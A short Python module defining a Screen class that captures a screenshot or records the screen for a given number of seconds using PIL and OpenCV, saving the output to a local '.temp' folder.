import cv2
import numpy as np
import os
from PIL import ImageGrab


class Screen():
    def __init__(self):
        pass

    def run(self, code, time=10):
        if code == "image":
            return self.screenshot()
        elif code == "video":
            return self.record(time)
        return False

    def screenshot(self):
        try:
            img = ImageGrab.grab()
            path = os.path.join('.temp', 'screenshot.png')
            img.save(path)
            return True
        except OSError:
            return False

    def record(self, time):
        try:
            fourcc = cv2.VideoWriter_fourcc('m', 'p', '4', 'v')
            fps = 12
 
            path = os.path.join('.temp', 'screen-record.avi')
            
            img = ImageGrab.grab()
            height = img.height
            width = img.width

            out = cv2.VideoWriter(path, fourcc, fps,
                                (width, height))

            for i in range(int(time * fps)):
                img = ImageGrab.grab()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                out.write(frame)
                cv2.waitKey(1)

            out.release()

            return True
            
        except OSError:
            return False
